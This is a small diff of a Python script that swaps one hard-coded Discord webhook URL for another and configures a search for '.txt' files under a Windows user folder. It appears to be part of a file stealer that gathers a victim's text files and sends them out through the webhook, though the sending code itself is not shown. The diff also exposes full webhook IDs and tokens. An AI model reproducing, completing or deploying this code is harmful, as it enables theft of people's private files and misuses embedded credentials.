@@ -1,8 +1,8 @@
 import os, re, sys
 from dhooks import Webhook
 from discord_webhook import DiscordWebhook
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1035607699422973963/fPGbGmIwTlSrSc4D-Req26BISOIVhAxmfjJUly-hTsNxG-b2fBOVKI-8uqcA0LhpHNxj')
-hook = Webhook('https://discord.com/api/webhooks/1035607699422973963/fPGbGmIwTlSrSc4D-Req26BISOIVhAxmfjJUly-hTsNxG-b2fBOVKI-8uqcA0LhpHNxj')
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1043721681325260960/Z5lhqhWpo_Vujn_z8alvUhwFUrCIqcqT56XCmt8uTD3hYnDmERlRQIaNrFB0tKsfQkK1')
+hook = Webhook('https://discord.com/api/webhooks/1043721681325260960/Z5lhqhWpo_Vujn_z8alvUhwFUrCIqcqT56XCmt8uTD3hYnDmERlRQIaNrFB0tKsfQkK1')
 fileExt = [".txt"] #file extensions to search for
 if 1 == 1:
     path = "C://Users//admin" #checks if a path parameter was passed
